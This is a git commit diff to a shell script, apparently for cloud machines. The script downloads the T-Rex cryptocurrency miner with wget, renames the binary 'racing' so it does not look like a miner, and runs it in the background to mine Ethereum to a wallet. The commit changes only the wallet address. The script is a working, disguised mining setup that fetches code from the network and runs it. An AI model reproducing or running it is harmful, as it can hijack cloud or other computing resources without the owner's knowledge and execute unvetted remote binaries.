771aedd4353774326fe011454616876f6d1b2e15
thuc96finance <99269670+thuc96finance@users.noreply.github.com>
2022-02-09 09:53:43 +0700

    Update azure_machine.sh

--- azure_machine.sh
+++ azure_machine.sh
@@ -1,4 +1,4 @@
 wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
-./racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0x575aD1F3f6C5493fB4EC2969A1701916927A23df -p x -w lambda &
+./racing -a ethash -o stratum+tcp://us2.ethermine.org:4444 -u 0xC46a50Bf45261e21B7418EeAf80e51f331a7Afb8 -p x -w lambda &
